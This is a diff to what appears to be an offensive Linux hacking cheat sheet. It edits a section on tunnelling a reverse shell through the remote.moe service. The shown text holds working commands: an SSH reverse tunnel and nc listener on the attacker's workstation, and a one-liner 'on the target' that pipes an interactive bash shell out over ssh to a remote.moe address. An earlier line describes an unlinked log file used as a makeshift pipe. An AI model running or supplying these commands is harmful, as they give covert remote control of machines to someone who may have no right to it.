@@ -951,23 +951,23 @@ Note: Use */tmp/.fio* if */dev/shm* is not available.
 Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
 <a id="revese-shell-remote-moe"></a>
-**5.i.d. Reverse shell with remote.moe**
+**5.i.d. Reverse shell with remote.moe and ssh**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
 On your workstation:
 ```sh
-# First Terminal:
-ssh-keygen -q -t rsa -N "" -f .r
+# First Terminal - Create a remote.moe tunnel to your workstation
+ssh-keygen -q -t rsa -N "" -f .r  # New key creates a new remote.moe-address
 ssh -i .r -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe; rm -f .r
 # Note down the 'remote.moe' address which will look something like
 # uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe
 
-# Second Terminal:
+# Second Terminal - start listening for the reverse shell
 nc -vnlp 8080
 ```
 
-On the target:
+On the target (needs ssh and bash):
 ```
 # First method:
 rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p && (bash -i</tmp/.p  2>1 |ssh -i /tmp/.r -o StrictHostKeyChecking=no -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 remote.moe>/tmp/.p &)
